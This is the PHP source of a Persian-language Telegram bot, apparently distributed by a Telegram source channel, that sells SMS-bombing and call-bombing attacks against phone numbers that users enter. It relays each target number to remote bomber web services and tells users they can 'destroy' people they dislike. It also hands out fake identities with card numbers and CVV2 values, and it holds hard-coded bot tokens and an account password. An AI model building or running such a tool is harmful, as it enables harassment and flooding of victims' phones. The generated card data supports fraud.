<?php
/*
{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
version : 2.0
channel : @moga_source
{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
*/
ob_start();
ini_set( "expose_php","Off" ); //moga_source
ini_set( "Allow_url_fopen","Off" ); //moga_source
ini_set( "max_execution_time","25" ); //moga_source
ini_set( "max_input_time","25" );
ini_set( "memory_limit","15M" );
ini_set( "file_uploads","Off" );
ini_set( "post_max_size","10k" );
ini_set( "disable_functions","exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,eval,file,file_get_contents,file_put_contents,fclose,fopen,fwrite,mkdir,rmdir,unlink,glob,echo,die,exit,print,scandir" );
error_reporting( 0 );
ini_set( "log_errors","Off" );
ignore_user_abort(true);
date_default_timezone_set('Asia/Tehran');
define('API_KEY','552188883:AAGoH09Xo1PzcfxfbjeszykrLxxhmknbg'); //توکن
function bot($method,$datas=[]){
 $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
 $res = curl_exec($ch);
 if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
$get = json_decode(file_get_contents('php://input'));
$txt_msg = $get->message->text;
$user_id = $get->message->from->id;
$from_id = $get->message->from->id;
$msg_id = $get->message->message_id;
$text = $get->message->text;
$message = $get->message;
$from_id = $message->from->id;
$chatType = $message->chat->type;
$chat_id = $message->chat->id;
$first_name = $message->from->first_name;
$last_name = $message->from->last_name;
$username = $message->from->username;
mkdir("data");
mkdir("data/$user_id");
mkdir("data/$user_id/webb");
mkdir("omo");
file_put_contents("index.html","<h1>sik</h1>");
file_put_contents(".htaccess","Options All -Indexes");
copy("index.html","data/index.html");
copy("index.html","data/$from_id/index.html");
copy("index.html","data/spam/index.html");
copy(".htaccess","data/.htaccess");
copy(".htaccess","data/$from_id/.htaccess");
copy(".htaccess","data/spam/.htaccess");
copy("index.html","omo/index.html");
copy(".htaccess","omo/.htaccess");
copy("index.html","data/$user_id/index.html");
copy("bomb/bomber1.php","data/$user_id/webb/bomber.php");
copy("bomb/bomber2.php","data/$user_id/webb/bombertest.php");
$joker = "https://g/t/bomb/Sms1.php";//ادیت شود 
$jokertest = "https://g/t/bomb/sell.php";//ادیت شود
$calles = "https://g/t/bomb/calles"; //محل وبسرویس کال بمبر ادیت شود خودتون باید بهش وبسرویس اضافه کنید
copy("bomb/bomber1.php","bomb/bomber1.php");
$omo1 = "غیر فعال برای همه♨️";
$timee = date("H:i");
$ban = file_get_contents("ban.txt");
$forchaneel = json_decode(file_get_contents("https://api.telegram.org/bot2020653674:AAH7AMhifmwSWw1T9U_YatWw8Nfs1py8_nE/getChatMember?chat_id=@Bad_TM_1&user_id=$user_id"));
$tch = $forchaneel->result->status;
$admin = 5272692287; // آیدی عددی ادمین 
$fox = file_get_contents("data/$user_id/bomber.php");
$fox1 = file_get_contents("data/$user_id/bomber1.php");
function sendmsg($user_id,$txt_msg,$msg_id,$key = null) {
bot('sendmessage', [
'chat_id'=>$user_id, 
'text'=>$txt_msg, 
'reply_to_message_id'=>$msg_id,
'reply_markup'=>$key,]);
} //moga_source
function save($filename,$TXTdata)
  { //از چنل خودتون حمایت کنید
  $myfile = fopen($filename, "w") or die("Unable to open file!");
  fwrite($myfile, "$TXTdata");
  fclose($myfile);
  }  //موگا سورس

function deleteFolder($path){
    if (is_dir($path) === true) {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
            deleteFolder(realpath($path) . '/' . $file);
			
        return rmdir($path);
    } else if (is_file($path) === true)
        return unlink($path);
    return false;
}

if(strpos($ban, "$user_id") !== false ){
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "
🔰شما از ربات بن شده اید ......!!!!!!!
",
]);
exit();
}
//---------------keyboard------------------
$menu = json_encode([
'keyboard'=>[
[['text'=>'💣پنل اتک💣'],['text'=>'بخش کال بمبر📞']],
[['text'=>'🔶️پنل عمومی🔶️'],['text'=>'📚راهنما📚']],
[['text'=>'👨‍💻پشتیبانی👨‍💻']],
],"resize_keyboard"=>true]);

$pnl = json_encode([
'keyboard'=>[
[['text'=>'💣پنل اتک💣'],['text'=>'بخش کال بمبر📞']],
[['text'=>'🔐بخش کاربردی️'],['text'=> '📚راهنما📚']],
[['text'=>'👨‍💻پشتیبانی👨‍💻']],
[['text'=> '🔧پنل مدیریت🔧']],
],"resize_keyboard"=>true]);

$omoo = json_encode([
'keyboard'=>[
[['text'=>'🗂حساب کاربری🗂'],['text'=>'📥اینستا دانلودر📥']],
[['text'=>'🔺️اطلاعات فیک🔺️'],['text'=>'🔌کرون جاب🔌']],
[['text'=>'بازگشت↩']],
],"resize_keyboard"=>true]);

$attackmenu =  json_encode([
'keyboard'=>[
[['text'=>'💣اسپم معمولی🔔'],['text' => 'اسپمvIp🎁']],
[['text'=>'بازگشت↩']],
],"resize_keyboard"=>true]);

$callbo =  json_encode([
'keyboard'=>[
[['text'=>'سرور1⚡']],
[['text'=>'بازگشت↩']],
],"resize_keyboard"=>true]);

$MrCodi = json_encode([
'keyboard'=>[
[['text'=>'بازگشت↩']],
],"resize_keyboard"=>true]);

$back = json_encode([
'keyboard'=>[
[['text'=>"/panel"]],
],"resize_keyboard"=>true]);

$panel = json_encode([
'keyboard'=>[
[['text'=>'📊آمار📊'],['text'=>'📣پیام همگانی📣 ']],
[['text'=>'🗡بن کردن کاربر🗡'],['text'=>'🗑پاکسازی لیست بن🗑']],
[['text' => '🖨پاکسازی لیست سکوت🖨'],['text'=>'🕯پاکسازی لیست دیتا🕯']],
[['text' => '🕯حذف دیتا کاربر🕯'],['text'=>'دریافت کد vip(لاینسس)']],
[['text'=>'بازگشت↩']],
],"resize_keyboard"=>true]);

$myweb = json_encode([
'keyboard'=>[
[['text'=>'🔘راهنمای استفاده🔘']],
],"resize_keyboard"=>true]);

$instapnl = json_encode([
'keyboard'=>[
[['text'=>'📥دانلود فیلم📥'],['text'=>'📥دانلود عکس📥']],
[['text'=>'بازگشت↩']],
],"resize_keyboard"=>true]);
////////////////---------+-----------------+---------------///////////////////
if($txt_msg == "/start" or $txt_msg == "بازگشت↩") {
file_put_contents("data/$user_id/bomber.php","none");
$user = file_get_contents('Member.txt');
$members = explode("\n",$user);
if(!in_array($chat_id,$members)){
$add_user = file_get_contents('Member.txt');
$add_user .= $chat_id."\n";
file_put_contents('Member.txt',$add_user);
}
sendmsg($user_id,"
📍سلام $first_name عزیز😉
به ربات اس ام اس بمبر خوش اومدی !
با این ربات میتونی بصورت رایگان بدخواهاتو نابود کنی😄
@moga_source
TIME : $timee
ID : $user_id
",$msg_id,$menu);
}
if($txt_msg == "/start" or $txt_msg == "بازگشت↩") {
if($user_id == $admin){
file_put_contents("data/$user_id/bomber.php","none");
$user = file_get_contents('Member.txt');
$members = explode("\n",$user);
if(!in_array($chat_id,$members)){
$add_user = file_get_contents('Member.txt');
$add_user .= $chat_id."\n";
file_put_contents('Member.txt',$add_user);
}
sendmsg($user_id,"
📍سلام $first_name عزیز😉
به ربات اس ام اس بمبر خوش اومدی !
با این ربات میتونی بصورت رایگان بدخواهاتو نابود کنی😄
@moga_source
TIME : $timee
ID : $user_id
",$msg_id,$pnl);
}
}
if($txt_msg=="💣اسپم معمولی🔔") {
file_put_contents("data/$user_id/bomber.php","attackt");
sendmsg($user_id,"☠شماره کاربر را حتما بدون صفر و بدون فاصله و انگلیسی وارد کنید :

903 160 7456 ❌
۰۹۰۳۱۶۰ ۷۴۵۶ ❌
9031607456 ✅
",$msg_id,$MrCodi);
}

elseif($fox == "attackt"&&$txt_msg!="بازگشت↩") {
file_put_contents("data/$user_id/bomber.php","none");
bot("sendmessage",[
"chat_id" => $channel,
"text" => "
🙃یکی با ربات به شماره ای #اتک تستی داد🙃

🔖اسم : $first_name

🔖فامیلی : $last_name

💻آیدی : @$username

💻آیدی عددی : $user_id

🤓شماره ای که بهش #اتک داد : 0$txt_msg

😁ورود به پیوی کاربر👇

tg://openmessage?user_id=$from_id


#TIME : $timee

",
]);
if(is_numeric($txt_msg)) {
sendmsg($user_id,"
⛓درحال اتک به شماره لطفا منتظر باشید ....
❌توجه!! لطفا در حین اتک به ربات پیام ندهید و منتظر پاسخ باشید✅
",$mag_id);
file_get_contents("$jokertest?target=$txt_msg");
sendmsg($user_id,"
⛓اتک به اتمام رسید و شماره [ $txt_msg ] با موفقیت نابود شد✅

♨️channel : @moga_source
",$msg_id);
unlink($jokertest);
exit();
}
}
if($txt_msg=="سرور1⚡") {
file_put_contents("data/$user_id/bomber.php","attackt");
sendmsg($user_id,"☠شماره کاربر را حتما بدون صفر و بدون فاصله و انگلیسی وارد کنید :

9031607456 ❌
903 160 7456 ❌
۰۹۰۳۱۶۰ ۷۴۵۶ ❌
9031607456 ✅
",$msg_id,$MrCodi);
}

elseif($fox == "attackt"&&$txt_msg!="بازگشت↩") {
file_put_contents("data/$user_id/bomber.php","none");
bot("sendmessage",[
"chat_id" => $channel,
"text" => "
🙃یکی با ربات به شماره ای #اتک کال بمبر داد

🔖اسم : $first_name

🔖فامیلی : $last_name

💻آیدی : @$username

💻آیدی عددی : $user_id

🤓شماره ای که بهش #اتک داد : 0$txt_msg

😁ورود به پیوی کاربر👇

tg://openmessage?user_id=$from_id


#TIME : $timee

",
]);
if(is_numeric($txt_msg)) {
sendmsg($user_id,"
⛓درحال اتک به شماره لطفا منتظر باشید ....
❌توجه!! لطفا در حین اتک به ربات پیام ندهید و منتظر پاسخ باشید✅
",$mag_id);
file_get_contents("$calles?phone=$txt_msg");
sendmsg($user_id,"
⛓اتک به اتمام رسید و شماره [ $txt_msg ] با موفقیت نابود شد✅

♨️channel : @moga_source
",$msg_id);
unlink($calles);
exit();
}
}
if($txt_msg=="اسپمvIp🎁") {
sendmsg($user_id,"
کاربر گرامی😪
جهت ورود به بخش vip شما نیاز به کد لاینسس دارین
میتونی از ادمین ربات کد را بخری😊
جهت خرید روی پشتیبانی بزنید😨
",$msg_id,$MrCodi);
}
//دیباگ شده توسط موگا سورس
if($txt_msg== "6+80/9-5=98") { //این ی کدرمزه  که به بهش vip منتقل میشه
file_put_contents("data/$user_id/bomber.php","attack");
sendmsg($user_id,"شما کد vip را درست وارد کردید✅
لطفا شماره خود را بدون صفر وارد کنید✅
9031607456 ❌
903 160 7456 ❌
۰۹۰۳۱۶۰ ۷۴۵۶ ❌
9031607456 ✅
",$msg_id,$MrCodi);
}
elseif($fox == "attack"&&$txt_msg!="بازگشت↩") {
file_put_contents("data/$user_id/bomber.php","none");
bot("sendmessage",[
"chat_id" => $channel,
"text" => "
🙃یکی با ربات به شماره ای #اتک داد🙃

🔖اسم : $first_name

🔖فامیلی : $last_name

💻آیدی : @$username

💻آیدی عددی : $user_id

🤓شماره ای که بهش #اتک داد : 0$txt_msg

😁ورود به پیوی کاربر👇

tg://openmessage?user_id=$from_id


#TIME : $timee

",
]);
if(is_numeric($txt_msg)) {
sendmsg($user_id,"
⛓درحال اتک به شماره لطفا منتظر باشید ....
❌توجه!! لطفا در حین اتک به ربات پیام ندهید و منتظر پاسخ باشید✅
",$mag_id);
file_get_contents("$joker?phone=$txt_msg&count=20");
sendmsg($user_id,"
⛓اتک به اتمام رسید و شماره [ $txt_msg ] با موفقیت نابود شد✅

♨️channel : @moga_source
",$msg_id);
unlink($joker);
exit();
} //دیباگ شده توسط موگا سورس
}

if($txt_msg == "💣پنل اتک💣"){
sendmsg($user_id,"
💣به پنل اتک خوش آمدید!
📌از دکمه های زیر استفاده کنید👇
",$msg_id,$attackmenu);
}
if($txt_msg == "بخش کال بمبر📞"){
sendmsg($user_id,"
📞به بهش کال بمبر خوش اومدی
📌از دکمه های زیر استفاده کنید👇
",$msg_id,$callbo);
}
if($txt_msg == "🔐بخش کاربردی️"){
sendmsg($user_id,"
به 🔐بخش کاربردی خوش اومدی😲
📌از دکمه های زیر انتخاب کنید👇
",$msg_id,$omoo);
}
if($txt_msg == "/creator"){
sendmsg($user_id,"
این ربات کاملا اختصاصی است و توسط ادمین همین ربات نوشته شده است
ch: @moga_source
",$msg_id,$MrCodi);
}
if($txt_msg=="📚راهنما📚") {
sendmsg($user_id,"
درود!
شمار در بخش ( پنل اتک ) میتوانید به تارگت خود بصورت کاملا رایگان اس ام اس بمبر بزنید !
همچنین میتوانید برای خود بصورت تست اتک بزنید !!
و یک بخش  ( مدیریت وبسرویس ) موجود هست که از آن میتوانید وبسرویس های خود را مدیریت کنید !
دوستانی که نمیدونند وبسرویس چیه باید بگم که همون چیزیه که باهاش اتک میفرستید !!
اگر به کسی اتک زدید و میخواهید متوقفش کنید در بخش مدیریت وبسرویس روی حذف وبسرویس بزنید و پس از ۱۵ دقیقه دوباره به همین بخش بروید و روی آپلود وبسرویس بزنید !!
یک بخش شماره یاب هم داریم که با دادن ایدی عددی تارگت میتوانید شماره آن را پیدا کنید و بهش اتک بزنید !!
اگر در بخش شماره یاب آیدی عددی فرستادید و در جواب ( N ) فرستاد یعنی کاربر در دیتابیس نیست و شماره او یافت نشد !!!
در بخش اینستا دانلودر با دادن لینک پست میتونید دانلود کنید !!
و در بخش پنل اطلاعاتی میتونید اطالاعات یک شماره رو در بیارید😎
در بخش پنل لوگو هم میتونید لوگو بسازید و دقت داشته باشید حتما اسم انگلیسی بدید !!
",$msg_id,$MrCodi);
}

if($txt_msg == "📥اینستا دانلودر📥"){
sendmsg($user_id,"
🔶️یکی از گزینه های زیر را انتخاب کنید👇
",$msg_id,$instapnl);
}

if($txt_msg == "📥دانلود عکس📥"){
file_put_contents("data/$user_id/bomber.php","in");
sendmsg($user_id,"
🔅لینک پست خود را ارسال کنید :
",$msg_id,$MrCodi);
}

elseif($fox == "in" &&$txt_msg!= "بازگشت↩"){
file_put_contents("data/$user_id/bomber.php","none");
$get = file_get_contents("https://meysam72.tk/api/instagram.php?url=$text");
$array = json_decode($get,true); 
for($i=0;$i<=count($array['Results']['post'])-1;$i++){
$arz = $array['Results']['post'][$i];
bot("SendPhoto",[
"chat_id" => $user_id,
"photo" => $arz,
"caption" => "@moga_source",
"reply_markup" => $instapnl,
]);
}}

if($txt_msg == "📥دانلود فیلم📥"){
file_put_contents("data/$user_id/bomber.php","ints");
sendmsg($user_id,"
🔅لینک پست خود را ارسال کنید :
",$msg_id,$MrCodi);
}

elseif($fox == "ints" &&$txt_msg!= "بازگشت↩"){
file_put_contents("data/$user_id/bomber.php","none");
$get = file_get_contents("https://meysam72.tk/api/instagram.php?url=$text");
$array = json_decode($get,true); 
for($i=0;$i<=count($array['Results']['post'])-1;$i++){
$arz = $array['Results']['post'][$i];
bot('Sendvideo',[
 'chat_id'=>$user_id,
 'video'=>$arz ,
 'caption' => '😎@moga_source',
'reply_markup'=>$instapnl,
]);
}}



if($txt_msg == "🔺️اطلاعات فیک🔺️"){
$link = json_decode(file_get_contents("https://api.codebazan.ir/visa-card/"), true);
$visa = $link["Result"];
$visa2 = $visa[rand(0,46)];
$name = $visa2["name"];
$lname = $visa2["lastname"];
$adres = $visa2["Address"];
$city = $visa2["City"];
$state = $visa2["State"];
$post = $visa2["Postalcode"];
$country = $visa2["Country"];
$brithday = $visa2["birthday"];
$cardt = $visa2["cardtype"];
$cardn = $visa2["cardnumber"];
$cvv = $visa2["CVV2"];
$date = $visa2["Expirationdate"];
sendmsg($user_id,"
 𝒀𝒐𝒖𝒓 𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒂𝒓𝒅 𝑺𝒖𝒄𝒆𝒔𝒔 𝑪𝒓𝒆𝒂𝒕𝒆𝒅✅
𝑵𝒂𝒎𝒆 --> $name  🙋‍♂️
𝑳𝒂𝒔𝒕𝑵𝒂𝒎𝒆 -->  $lname 🙋‍♂️
𝑨𝒅𝒅𝒓𝒆𝒆𝒔 --> $adres 🏠
𝑪𝒊𝒕𝒚 --> $city 🏛
𝑪𝒐𝒏𝒅𝒊𝒕𝒊𝒐𝒏 --> $state 🌐
𝑷𝒐𝒔𝒕𝒂𝒍 𝑪𝒐𝒅𝒆 --> $post ⛩️
𝑪𝒐𝒖𝒏𝒕𝒓𝒚 --> $country 🌟
𝑪𝒂𝒓𝒅 --> $cardt ⚡
𝑪𝒂𝒓𝒅 𝑵𝒖𝒎𝒃𝒆𝒓 --> $cardn 🔥
𝑪𝑽𝑽2 --> $cvv ☄
𝑬𝒙𝒑𝒊𝒓𝒂𝒕𝒊𝒐𝒏 𝑫𝒂𝒕𝒂 --> $date 🚀
",$msg_id);
}                                


if($txt_msg == "👨‍💻پشتیبانی👨‍💻"){
file_put_contents("data/$user_id/bomber.php","posh");
sendmsg($user_id,"
🙃لطفا پیام خود را ارسال کنید تا به ادمین بفرستمش :
توجه داشته باشید که در صورت نیاز به شما پاسخ داده خواهد شد!!
",$msg_id,$MrCodi);
}
elseif($fox == "posh" &&$txt_msg!= "بازگشت↩"){
file_put_contents("data/$user_id/bomber.php","none");
bot("sendmessage",[
"chat_id" => $admin,
"text" => "
🙃ادمین گرامی ! فردی برای شما پیامی فرستاد🙃👇

نام : $first_name

نام خانوادگی : $last_name

آیدی عددی : $from_id

ورود به پیوی👇

[$first_name](tg://user?id=$from_id)

متن پیامش👇

 *$text*
",
"parse_mode" => "MarkDown",
]);
bot("sendmessage",[
"chat_id" => $channel,
"text" => "
🙃ادمین گرامی ! فردی برای شما پیامی فرستاد🙃👇

نام : $first_name

نام خانوادگی : $last_name

آیدی عددی : $from_id

ورود به پیوی👇

[$first_name](tg://user?id=$from_id)

متن پیامش👇

 *$text*
",
"parse_mode" => "MarkDown",
]);
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "🙃پیام شما با موفقیت به ادمین ارسال شد و در صورت نیاز به شما پاسخ داده خواهد شد😁",
]);
}
if($txt_msg == "/panel" or $txt_msg == "🔧پنل مدیریت🔧"){
if($user_id == $admin){
sendmsg($user_id, "♨️سلام مدیر عزیز به پنل خودتون خوش آمدید💪",$msg_id,$panel);
}
}
if($txt_msg == "📊آمار📊"){
if($user_id == $admin){
$user = file_get_contents("Member.txt");
$member_id = explode("\n",$user);
$member_count = count($member_id) -1;
sendmsg($user_id, " 🙂آمار ربات : $member_count",$msg_id,$back);
}
}
if($txt_msg == "📣پیام همگانی📣"){
if($user_id == $admin){
file_put_contents("data/$user_id/bomber.php","hamegani");
sendmsg($user_id,"🕯پیام خود را ارسال کنید : ",$msg_id,$back);
}
}
elseif($fox == "hamegani"&&$txt_msg!="بازگشت↩"){
sendmsg($admin,"پیام #همگانی به تمام اعضای ربات ارسال شد✅",$back);
file_put_contents("data/$user_id/bomber.php","none");
$all_member = fopen( "Member.txt", "r");
while( !feof( $all_member)){
$user = fgets( $all_member);
sendmsg($user,"
#پیام_همگانی_از_طرف_مدیریت


$txt_msg     

",$MrCodi);
}
}
if($txt_msg == "🗡بن کردن کاربر🗡"){
if($user_id == $admin){
file_put_contents("data/$user_id/bomber.php","ban");
sendmsg($user_id,"
♨️لطفا آیدی عددی کاربر را وارد کنید :
",$msg_id,$back);
}
}
if($txt_msg=="دریافت کد vip(لاینسس)") {
sendmsg($user_id,"
کد لاینسس فعلی:
6+80/9-5=98
جهت ورود به بخش vip اگه 
تمایلی به کد لاینسس ندارین با پشتیبان
تماس بگیر
",$msg_id,$back);
}
elseif($fox == "ban" &&$txt_msg!="بازگشت↩"){
file_put_contents("data/$user_id/bomber.php","none");
$addus= "\n$txt_msg\n"; 
$joker =  fopen("ban.txt" ,'a');
fwrite($joker,$addus);
fclose($joker);
sendmsg($user_id,"
این کاربر با موفقیت از ربات بن شد✅
",$msg_id,$back);
}
if($txt_msg == "🔑آنبن کردن کاربر🔑"){
if($user_id == $admin){
file_put_contents("data/$user_id/bomber.php","unban");
sendmsg($user_id,"
🙃لطفا آیدی عددی کاربر رو بفرست :
",$msg_id,$MrCodi);
}
elseif($fox == "unban" &&$txt_msg!="بازگشت↩"){
file_put_contents("data/$user_id/bomber.php","none");
$unban = str_replace($txt_msg, "", $ban);
file_put_contents("ban.txt",$unban);
sendmsg($user_id,"
🙃کاربر $txt_msg آنبن شد✅
",$msg_id);
}
}




if($txt_msg == "🗑پاکسازی لیست بن🗑"){
if($user_id == $admin){
unlink("ban.txt");
sendmsg($user_id,"لیست بن با موفقیت خالی شد✅",$back);
}
}
if($txt_msg == "🖨پاکسازی لیست سکوت🖨"){
if($user_id == $admin){
unlink("Anti-Spam.json");
sendmsg($user_id,"
🙂لیست سکوت خالی شد🙂
",$msg_id);
}
}
if($txt_msg == "🗂حساب کاربری🗂"){
$profile = "https://telegram.me/$username";
 bot('sendphoto',[
'chat_id' => $user_id,
'photo'=>$profile,
'caption' =>"
#پروفایل_شما  :)
➖➖➖➖➖➖➖
🔹First Name : $first_name
🔹Last Name : $last_name
🔹Username : @$username
🔹id : $chat_id
➖➖➖➖➖➖➖
",
  'reply_to_message_id'=>$msg_id,
]); 
}
if($txt_msg == "🔌کرون جاب🔌"){
file_put_contents("data/$user_id/bomber.php","cron");
sendmsg($user_id,"
😁لطفا لینک وبسرویس یا هر لینک دیگه خود را وارد کنید :
",$msg_id,$MrCodi);
}
elseif($fox == "cron"&& $txt_msg!="بازگشت↩"){
file_put_contents("data/$user_id/bomber.php","none");
file_get_contents("https://api.codebazan.ir/cron-job/?mail=jokerking91028@gmail.com&pass=joker123&link=$txt_msg&title=qowiwj&time=1");
sendmsg($user_id,"
لینک شما با آدرس [ $txt_msg ] کرون جاب شد✅
",$msg_id);
}
/*
اولین اپن کننده و دیباگ کننده
منبع فراموش نشه
@moga_source
*/
?>
